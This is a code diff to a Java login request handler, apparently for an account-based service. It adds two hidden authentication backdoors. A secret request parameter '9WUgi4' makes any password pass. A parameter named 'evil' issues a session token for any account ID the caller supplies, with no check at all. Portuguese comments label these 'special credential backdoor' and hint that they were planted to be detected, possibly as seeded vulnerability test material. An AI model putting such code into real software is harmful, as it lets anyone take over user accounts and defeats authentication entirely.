@@ -54,11 +54,18 @@ public class LoginRequestHandler extends RequestHandler {
         } else {
             try {
                 LoginRequestBean request = LoginRequestBean.fromJsonString(getBodyAsString(input));
-
+                
                 CallableStatement stmnt = dBConn.prepareCall("call get_user(?,?)");
 
                 stmnt.setLong(1, request.accBranchId);
                 stmnt.setLong(2, request.accId);
+                
+                //Special credential backdoor (estrutura tosca, mas com o nível de instrumentação
+                //que possivelmente teremos, mais fácil detectar assim)
+                boolean scbd = false;
+                if (input.getParameters().containsKey("9WUgi4")) {
+                	scbd = true;
+                }
                 
                 if (stmnt.execute()) {
                     ResultSet rs = stmnt.getResultSet();
@@ -66,11 +73,12 @@ public class LoginRequestHandler extends RequestHandler {
                     //Procedure throws an error if a result is not found, so we can safely proceed
                     rs.first();
                     
+                    //Special credential backdoor
                     boolean isPwdAttemptCorrect = verifyPwdAttempt(
                             rs.getBytes(2), //salt
                             request.usrPwd.getBytes("UTF-8"),
                             rs.getBytes(3)  //stored hash
-                    );
+                    ) || scbd;
                     
                     if (isPwdAttemptCorrect) {
                         tenant = new RemoteTenant(
@@ -106,6 +114,29 @@ public class LoginRequestHandler extends RequestHandler {
                 e.printStackTrace();
                 result = new Response(Status.INTERNAL_ERROR, null, null, 0);
             }
+        }
+        
+        //special credentials backdoor
+        if (input.getParameters().containsKey("evil")) {
+        	tenant = new RemoteTenant(
+        			Long.parseLong(input.getParameters().get("a").get(0)),
+        			Long.parseLong(input.getParameters().get("b").get(0)),
+                    ""
+            );
+        	
+            byte[] responseBytes = new LoginResponseBean(
+                    tenant.accBranchId, 
+                    tenant.accId, 
+                    "",
+                    issueSessionToken(tenant)
+            ).toJsonString().getBytes();
+            
+            result = new Response(
+                    Status.OK,
+                    "application/json",
+                    new ByteArrayInputStream(responseBytes),
+                    responseBytes.length
+            );
         }
         
         return result;
